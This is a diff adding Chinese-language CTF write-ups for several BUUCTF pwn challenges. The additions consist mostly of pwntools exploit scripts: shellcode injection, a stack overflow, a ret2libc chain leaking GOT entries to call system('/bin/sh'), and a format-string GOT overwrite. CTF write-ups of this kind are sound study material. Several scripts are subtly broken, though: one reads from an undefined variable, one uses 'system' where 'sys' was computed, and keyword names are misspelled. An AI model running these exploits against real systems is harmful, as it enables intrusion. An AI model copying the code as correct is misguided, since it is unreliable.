@@ -474,3 +474,137 @@ p.sendlineafter(': ',b'2jctf_pa5sw0rd'+b'\x00'*0x3a+p64(backdoor))
 p.interactive()
 ```
 
+## 56 picoctf_2018_shellcode
+
+***ret2shellcode***
+
+题比较简单，尝试了一下盲打
+
+```shell
+❯ ./pwn
+Enter a string!
+aaaaaa
+aaaaaa
+Thanks! Executing now...
+[1]    2462 segmentation fault  ./pwn
+```
+
+根据运行情况，猜测是输入相关字符串并当作函数执行，所以直接写入`shellcode`试试
+
+```python
+from pwn import *
+p = remote('node5.buuoj.cn',28483)
+p.sendline(asm(shellcraft.sh()))
+p.interactive()
+```
+
+然后打通了
+
+## 57 hitcontraining_magicheap
+
+施工中
+
+## 58 jarviso_level1
+
+本身应该挺简单的，但是远程和本地的输出不一样
+
+本地：
+
+```python
+from pwn import *
+context.log_level = 'debug'
+p = process('./pwn')
+p.recvuntil(b':')
+buf_addr = int(p.recv(10),16)
+log.info(hex(buf_addr))
+
+payload = asm(shellcraft.sh()).ljust(0x87+0x4,b'b')+p32(buf_addr)
+p.sendline(payload)
+p.interactive()
+```
+
+接受buf的地址，然后`ret`回`buf`处执行`shellcode`
+
+但是远程要先输入再回显，所以只能`ret2libc`
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+p=remote('node5.buuoj.cn',29446)
+elf=ELF("./pwn")
+main_addr=0x80484b7
+write_plt=elf.plt['write']
+write_got=elf.got['write']
+
+payload=b'a'*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)
+
+p.send(payload)
+write_addr=u32(r.recv(4))
+
+libc=LibcSearcher('write',write_addr)
+libc_base=write_addr-libc.dump('write')
+
+system_addr=libc_base+libc.dump('system')
+bin_sh=libc_base+libc.dump('str_bin_sh')
+payload =b'a'*(0x88+0x4)+p32(system_addr)+p32(main_addr)+ p32(bin_sh)
+
+p.send(payload)
+p.interactive()
+```
+
+## 59 axb 2019 fmt32
+
+***fmt+ret2libc***
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+#gdb.attach(p)
+
+printf_got = elf.got['printf']
+printf_plt = elf.plt['printf']
+payload = b'a'+p32(printf_got)+b'b'+b'%8$s'
+p.sendlineafter(b'me:', payload)
+
+p.recvuntil(b'b')
+printf_addr = u32(p.recv(4))
+log.info("prinf_addr:"+hex(printf_addr))
+
+libc = LibcSearcher('printf',printf_addr)
+libc_base = printf_addr - libc.dump('printf')
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+
+payload2 = b'a'+fmtstr_payload(8,{printf_got:system},wirte_size = 'byte',numbwritten = 0xa)
+p.sendline(payload2)
+p.sendline('/bin/sh\x00')
+p.interactive()
+```
+
+### 分析
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/buuctf/59/pwn'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+```
+
+![image-20250216163343339](./images/image-20250216163343339.png)
+
+在第25行有明显`fmt漏洞`,经过输入查询发现我们的输入偏移为8（但不完全是）
+
+> gdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题
+
+在`printf_got`后面加一个`b'b'`为了做为`recvuntil()`的标记
